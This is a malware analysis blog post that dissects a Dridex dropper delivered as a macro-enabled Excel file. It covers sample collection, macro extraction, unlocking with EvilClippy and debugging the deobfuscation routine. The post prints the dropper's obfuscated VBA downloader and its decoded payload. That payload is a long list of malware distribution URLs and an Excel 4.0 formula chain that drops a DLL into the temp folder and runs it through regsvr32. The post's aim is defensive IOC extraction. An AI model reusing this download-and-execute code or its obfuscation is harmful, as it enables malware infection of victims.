---
title: "Dissecting a Dridex Dropper"
date: 2021-01-29
type: "post"
---
![Dridex Image](/img/DRIDEX.jpg)

## Grabbing some Samples
Since I wanted to make sure and grab some more recent samples, I headed over to [Malware Bazaar](https://bazaar.abuse.ch/) to grab a few samples.  Since the database is searchable, I can throw in keyword searches (like Dridex) in order to filter the malware samples that I get back.  

![Malware Bazaar](/img/malwarebazaar.png)

Here I went ahead and search for `signature:dridex` and filter by the most recently submissions.  Now, since I'm grabbing samples that have already been reporting, I know that I'm not going to be submitting the file hash that actually blocks it.  What I can do is extract other IOCs from the files that could possibly help out other malware researchers catch samples more quickly next time.

![Searching Malware Bazaar](/img/search_bazaar.png)


1. `09cceb619174c99d026734f860f26cda0107af31b9153a9f7d6613c86fd57772.xlsm`
2. `4840443a33395062157663a7c4867ee0fcf045db025470b700da29fba3ef65d9.xlsm`
3. `53c9fcabdc30f2bf24bc0c3a8586de2986417b3e51d697530c8a84a7cea37f79.xlsm`
4. `590c526905cf29c7ebfa768768a6181598dd0b7da1a3eb4a2d40db1a5b5abf5d.xlsm`
5. `8742949a7f191d62317a4aef581b93991af1c94b0f50de6b7fc61743c073ce9a.xlsm`
6. `98d9bf0e52d0dd5744a283db292239230c072e541b6edb0b0eb6b53265bf3667.xlsm`
7. `af975a75c61e34bfe147221fc395b893d8306c93a8e80e17d43acddf2a4f1da0.xlsm`
8. `c7e6848fd63681514d6dad3032e358a257dde3aa1cd3b349306283356bca2608.xlsm`
9. `ec29ebe36aee5832b495e0db3303d9f26122a2b58e2d1d92078f9f2c31d25954.xlsm`
10. `fa8ed75cfc69a06cf1e809531f7371b5c75fd480339ae65568785b76387ceaa0.xlsm`

## Initial Examination

Everyone single one of these consisted of the same file format, which isn't surprising seeing as they were probably all apart of the same campaign.

![Showing filetype](/img/filetype.png)

All of the samples contained extremely current dates implying that the matter was urgent.  Additionally they all were named appropriately for a scenario that would involve Excel.  Lastly, all of the documents were financially motivated in order to compel the victim in clicking faster with less forethought.
![File1](/img/filename_1.png)
![File2](/img/filename_2.png)
![File3](/img/filename_3.png)


![SE Enable Content](/img/enable_content_pic.png)


## Focusing Efforts

It's from here I decided to focus on `09cceb619174c99d026734f860f26cda0107af31b9153a9f7d6613c86fd57772.xlsm` since it had the most interesting VBA Macros.  

If you haven't used OleVBA (or the entire [suite](https://github.com/decalage2/oletools) of tools honestly) then I highly suggest you check them out.  It's one of the first things I run every time when inspecting malicious macro documents.

`remnux@remnux:~/dridex$ olevba 09cceb619174c99d026734f860f26cda0107af31b9153a9f7d6613c86fd57772.xlsm`
```VB
olevba 0.55.1 on Python 3.6.9 - http://decalage.info/python/oletools
===============================================================================
FILE: 09cceb619174c99d026734f860f26cda0107af31b9153a9f7d6613c86fd57772.xlsm
Type: OpenXML
Error: [Errno 2] No such file or directory: 'xl/vbaProject.bin'.
Error: [Errno 2] No such file or directory: 'xl/activeX/activeX1.bin'.
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Resize1Pages6()
mi_1
End Sub
Private Sub vbox1_cli_Layout()
t = 6: t = t * t: mi_1
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 And Win64 Then
    Private Declare PtrSafe Function P_Click_Box Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As LongPtr, _
        ByVal lpfnCB As LongPtr _
      ) As Long
#Else
    Private Declare Function P_Click_Box Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As Long, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long _
      ) As Long
#End If



Function sb_t()
sb_t = hokkkk(4, 4) & hokkkk(3, 55)
End Function

Function hokkkk(s, j As Integer)
If j > 5 Then jj = 1 Else jj = -1
For Each u In Sheets(s).UsedRange.SpecialCells(xlCellTypeConstants): m = u: Next
v1 = Split(StrConv(m, 64), Chr(0)): For Each vv1 In v1: On Error Resume Next: k = k & Chr(Asc(vv1) + jj): Next: hokkkk = k
End Function
Function ellysio()
ellysio = 5 - 3
End Function
Function redline(yel As Integer)
redline = "$"
If yel = 2 Then redline = "]"
End Function
Function mi_1(Optional wq As Integer) As Integer
Dim O As Integer: Dim Oa As Integer: ol = 1
Sheets(ol).Cells(ellysio, ol).Name = oo2 & "mo":
govs = sb_t
Oa = 9: kij = Split(govs, "="): Ada = Split(kij(ol), redline(ellysio))
aa = 2

For u = 1 To UBound(Ada) - LBound(Ada) + 1
On Error Resume Next
Sheets(ol).Cells(aa, ol).value = "=" & Ada(u)
Run (oo2 & "mo")
If u = 13 Then directoo = gogog
If u = 15 Then
fillename = gogog
P_Click_Box 0, homedep(Split(kij(0), redline(Oa))), directoo & "\" & fillename, 0, 0
End If
Next
Sheets(ol).Range("A1:B5").Clear
End Function
Function oo2()
oo2 = "forsS_"
End Function
Function homedep(nimo As Variant) As String
Randomize: df = 2 - 1: homedep = nimo(Int((UBound(nimo) + df) * Rnd))
End Function

Function gogog()
gogog = Sheets(1).Range("B1:B5").SpecialCells(xlCellTypeConstants)
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |vbox1_cli_Layout    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+


```


If our goal was simply to detect whether or not this file was malicious, we could safely point to several suspicious activities that have nicely been displayed for us.  The VBA code doesn't look like anything intelligible, and that's on purpose.  The seemingly random function declarations and nonsense variables all have a hidden purpose: to hide their actual purpose.

Most of the time the end goal is to deobfuscate a PowerShell oneliner, or possible a WinAPI function call to drop some sort of payload.  This document s no different, attempting to both reach out to malicious URLs, and execute a second stage DLL loader.

To be able to discern what the URLs the document is really trying to do, we need to be able to run the macro code using a debugger.  By doing this we can skip a lot of the tedious manual code reversing that would be necessary to figure out what it's doing. (Don't worry I did that too, you'll see why in the next part)

### Viewing the Macro Code

Great, so we were able to extract the code onto our Linux machine, but now we want to view it in Office's VBA editor and debug it.

Now normally, this isn't a big ask -- we're able to simply able to open the document and get to work.  However with this variant we were greeted with a unfamiliar error message.

![Unable to open Macro](/img/unable.png)

This through me for a spin for quite some time.  I did some research on the issue and found that it's quite commonplace for malware authors to password protect their code. However, that wasn't the case with this document, as it simply wouldn't let us interact with the macro at all.

This is the part where I'd like to tell you I stopped being stupid and automatically solved it but I would be lying :).  Instead I began to reverse engineer the code manually and try to figure out how the code was obfuscating it's payload. I honestly made it a decent ways until I realize that I was no longer going to get any further without having access to the raw data in the spreadsheets.

That's when I found this: [VBA Project Locked Project is Unviewable](https://medium.com/walmartglobaltech/vba-project-locked-project-is-unviewable-4d6a0b2e7cac )

It turns out that the malware authors had read the same article as me, using a tool developed by Walmart called 'EvilClippy'.  EvilClippy allows adversarial emulation teams the ability to be able to do numerous things with Office docs, including **making the VBA code locked!**

After compiling the project quick and running it with the `-uu` flag I was able to create a secondary document with all the macros unlocked and viewable.

![Doc Unhidden](/img/evlclippy_work.png)



![Debugger](/img/debugger.png)

## Understanding the Code

It was from here I was able to set breakpoints on several interesting functions, additionally watching variables as they change over time to see where the decoding was happening. I won't bore you with the details too much, so I'll try to make it quick.

I started with looking at where execution ends.  Execution ends when the binary is able to successfully reach out to the internet and grab it's second stage. To do that we know from `olevba` that it has to called *URLDownloadFileA*.

```VB
'Declaring the URLDownloadToFileA structures
#If VBA7 And Win64 Then        'Executes if Win64wwwwwwwww
    Private Declare PtrSafe Function P_Click_Box Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As LongPtr, _
        ByVal lpfnCB As LongPtr _
      ) As Long
#Else
    Private Declare Function P_Click_Box Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As Long, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long _
      ) As Long
#End If
```
Here we can see the setup of call, along with all of the different variable types that it accepts.  Since my goal is to identify the potential URL domains, we'll focus on tracking down the `szURL` parameter.

Now that it's referred to as *P_Click_Box*, a simple Ctrl+F will bring us to the next reference.

```vb
'calling of URLDownloadToFileA =============================================
P_Click_Box 0, homedep(Split(kij(0), redline(Oa))), directoo & "\" & fillename, 0, 0
                    'szURL      'expression 'delimiter              'szfilename 
```

The obfuscation begins!  Clearly all of the arguments passed into the `URLDownloadToFileA` function are obfuscated behind multiple different functions that ultimately end up delivering the argument's it's expecting.

If we go ahead and skip ahead through execution and set a breakpoint on the `homedep()` function, we can inspect the return contents to see the URL it ends up producing.

![Produced URL](/img/produced_url.png)

That's great and all....but we want ALL the domains.  So let's dive into how their decoding them so we can do just that :D.

Skipping some red herring functions and random variable declarations, we eventually end up looking at the contents of the *sb_t* function.

```vb
Function sb_t()
sb_t = hokkkk(4, 4) & hokkkk(3, 55)
End Function
```
All this functions ends up doing is calling the `hokkk()` function twice, passing two separate sets of input into it each time.  This functions happens to be the main part of the macro code we're interested in, being responsible for grabbing the obfuscated blob of text from different sections of the Excel document.

```vb
'PAYLOAD RETRIEVER ===========================================================================
Function hokkkk(s, j As Integer)
If j > 5 Then jj = 1 Else jj = -1 '-1 decoddes the first section, +1 the second
'J82 or 
For Each u In Sheets(s).UsedRange.SpecialCells(xlCellTypeConstants): m = u: Next
'm = the hidden obfuscated characters
'strconv converts the chars to Unicode and then returns an single element array
'the way it does this is by supply a zero-length string to split (aka Chr(0)) https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/split-function
v1 = Split(StrConv(m, 64), Chr(0)) 'v1 = string of unOBFUSCATED characters
For Each vv1 In v1 'for each char in v1
On Error Resume Next
 k = k & Chr(Asc(vv1) + jj) 'take the unicode numerical value + jj (-1 or 1) and then add it to our massive string of urls (k)
Next
 hokkkk = k 'return new url and payload
```

Great. Now if we run through these two loops the macro has successfully located it's obfuscated payload, obfuscated it, and concatenated it into two large strings that look like this:

**Section1**
```txt
http://joselito.1stwebs.org/d7uod8.rar$http://riveroaksautogroup.com/raeigb8.rar$http://urguru.paulhugh.es/f77i5e.zip$http://profumiecosmeticiessens.b2i.cloud/wb836k.rar$http://urihk.com/raaxrm0mn.rar$http://radoncqueens.com/tfnpwfjj.rar$http://love.ivpr.org/u1oqp2.rar$http://test.primeranks.net/ly6tnmlw.zip$http://nutri-bold.seriesnow.top/cvxa816n2.rar$http://trucos-para.ganar-dinero-hoy.com/slmxaikv.zip$http://www2.lotesbrisamar.es/t991kf.rar$http://bys.anupdave.com/ola8fcfh.zip$http://staging.svr.deveyesgroup.com/fc604xp8.zip$http://soporte1.eduardoabreu.com/ebhsdv63.zip$http://sadaprod.com/bttxlf4.zip$http://vetrine.1ecom.it/haox2v.rar$http://laureys.be/uzssv27.rar$http://radiationtherapyqueens.com/ln7jdm.zip$http://luminouspla.net/t1a9t50v.zip$http://aaa.ivpr.org/c3du5tw.zip$http://pmglance.startwriteup.com/vvx5qo7.zip$http://cms.ivpr.org/by9zwa7p1.zip$http://ubereats.fr.pilot.ba/z7rj4qvle.rar$http://artec.com.tr/xkpffwn.zip$http://panther-hosting.co.uk/treurjrq.zip$http://selarasgroup.co.id/gn3l49.zip$http://peau.ivpr.org/a3o1wnvp.zip$http://trainingzoneatlanta.com/u49wl9p.zip$http://www.gastronauts.asia/ylztwx.rar$http://argentina.ganar-dinero-hoy.com/kzjvz80.rar$http://handyman.macleannsw.com/pu4kty2l.rar$http://salaodigitalautomovel.pt.deve.pt/d8ms3mljy.zip$http://services.tapling.deveyesgroup.com/bey0q9xg.zip$http://ajaelectric.net/dmhmrz.zip$http://kosinlab.com

```
**Section2**
```txt
/zhhjw8.zip$http://gavidia.ivpr.org/ws2x19x.zip$http://proyectos.ivpr.org/ntewb3.rar$http://lp.rigiad.org/r9b7toi38.rar$http://choicenz.blissgene.com/hez20gauw.zip$http://trypar.deve.pt/cd2vg1b.zip$http://carzone.deve.pt/s3zpciz99.rar$http://cristianadorin.ro/w7tlyfq.rar$http://syukur.seriesnow.top/bc5hlc.zip$http://phoebecorke.com/phoebecorke.com/Scripts/Widgets/Navbar//jhax4k.rar$http://rmp.skswebsites.com/zfkdoc.rar$http://crownmoversatlanta.com/k4acudk7b.zip$http://blifemm.com/shwebank4u.blifemm.com/report/wp-admin/js/widgets//ppodyg.zip$http://monitrade.net/h79fwesfe.rar$http://boomaxgolf.com/e7h7jt9.rar$http://bafnabrotherskesarwala.com/ys95lm6k.rar=SET.NAME("b0b",CHAR(101))]SET.NAME("i0","J")]SET.NAME("w000","\")]IF(ISNUMBER(SEARCH("do",GET.WORKSPACE(1))),`y112G`,CLOSE(FALSE))]SET.NAME("o0","32")]CANCEL.KEY(TRUE)]SET.NAME("w00",b0b)]CANCEL.KEY(TRUE)]SET.NAME("v0","O")]SET.NAME("ohgdfww","h"&w00&"llEx"&w00&"cut"&w00)]SET.NAME("wegb","Sh"&w00&"ll")]SET.NAME("bb",LEFT(GET.WORKSPACE(23),(FIND("Roaming",GET.WORKSPACE(23),1)-1))&"Local"&w000&"T"&b0b&"mp"&w000)]SET.VALUE(B2,bb)]SET.NAME("ab",LEFT(CHAR(RAND()*26+97)&CHAR(RAND()*26+97)&CHAR(RAND()*26+97)&CHAR(RAND()*26+97)&CHAR(RAND()*26+97)&CHAR(RAND()*26+97)&CHAR(RAND()*26+97)&CHAR(RAND()*26+97),RAND()*8+5)&".dll")]SET.VALUE(B2,ab)]CALL(wegb&o0,"S"&ohgdfww&"A",i0&i0&"CCCC"&i0,0,v0&"p"&w00&"n","r"&w00&"gsvr"&o0,"`y112G`-s`y112G`"&bb&ab,0,0)
```

The next major function call in the macro code focuses on splitting up URLs into array elements based on the preconfigured delimiters.  We can notice in the *Section 2* that URLs are combined with some more Excel formula junk that does other things. (It ends up running a Shell32 command to execute the eventually downloaded DLL but that's not our focus right now)  Clearly that isn't possible of running as is, so we look continue following execution.

```vb
govs = sb_t
Oa = 9: kij = Split(govs, "="): Ada = Split(kij(ol), redline(ellysio))
```
The code snippet above focuses on splitting based on the `=` character first, separating the URLs from the Excel formulas in *Section 2*.  Next it splits again on the same set of data, using the delimiter of '$' (return from the function below).

```vb
Function redline(yel As Integer)
redline = "$"
If yel = 2 Then redline = "]"
End Function
```

This gets a nice array of each URL nicely split from each other in *Section 2*.  It performs this split operation again on *Section 1*, and finally concatenates the data together.

Now, I've been following each one of these variables in the debugger window this whole time.  This allows me to see the final resulting list of URLs in plaintext and extract them nicely.  Only problem? Too big.

I was able to find out this nice trick to be able to view it but going to `View->Immediate Window` which opens up a debug window that I manually use to print out the variable value.

![Immediate Window Debug](/img/debug.png)

### Implementing in Python

A lot of malware campaigns will use similar schemes to the one above multiple times in different droppers, so an understanding how the code actually works is a valuable bit of information.  Even better is if we can somehow automate the process so if we happen to run across another sample utilizing the same schema, we can easily pull out the IOCs.

Below is the Python code I wrote utilizing the `openpyxml` library to do most of the heavy lifting.

{{< gist arokota 7cff3d3a1c0f062148db7b8205072217 >}}


Here's it running on the document:

![Python Running](/img/python_run.png)


**References:**

1. https://zeltser.com/media/docs/analyzing-malicious-document-files.pdf
2. https://security-soup.net/analysis-of-a-dridex-downloader-with-locked-excel-macros/
3. https://medium.com/walmartglobaltechvba-project-locked-project-is-unviewable-4d6a0b2e7cac 
4. https://github.com/outflanknl/EvilClippy
5. http://www.cpearson.com/excel/hidden.htm 


